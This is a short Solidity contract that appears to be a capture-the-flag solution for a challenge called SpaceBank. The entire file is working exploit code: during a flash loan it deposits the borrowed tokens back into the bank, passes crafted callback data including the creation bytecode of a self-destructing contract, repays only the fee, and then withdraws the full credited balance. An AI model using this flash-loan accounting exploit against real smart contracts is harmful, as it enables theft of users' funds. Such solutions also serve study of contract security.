pragma solidity ^0.8.9;

import "./SpaceBank.sol";

contract SpaceBankSolution {
    SpaceBank public spaceBank;
    SpaceToken public token;
    address public owner;
    bytes public bytecode;
    uint256 private count = 0;

    constructor(address _spaceBank, address _token) {
        spaceBank = SpaceBank(_spaceBank);
        token = SpaceToken(_token);
        owner = msg.sender;
        bytecode = type(DummyTransfer).creationCode;
    }

    function executeFlashLoan(
        uint256 amount
    ) external returns (bool success, bytes memory result) {
        uint256 fee = amount / 1000;

        token.approve(address(spaceBank), amount);

        if (count == 0) {
            spaceBank.deposit(amount, abi.encode(block.number % 47));
        } else {
            spaceBank.deposit(amount, bytecode);
        }
        count++;

        spaceBank.withdraw(fee);

        // dummy result
        success = true;
        result = abi.encodeWithSignature("showMsgDetail()");

        // paid back fee only
        token.transfer(address(spaceBank), fee);
    }

    function withdrawAll() public {
        spaceBank.withdraw(spaceBank.balances(address(this)));
    }
}

contract DummyTransfer {
    constructor() {
        selfdestruct(payable(msg.sender));
    }
}
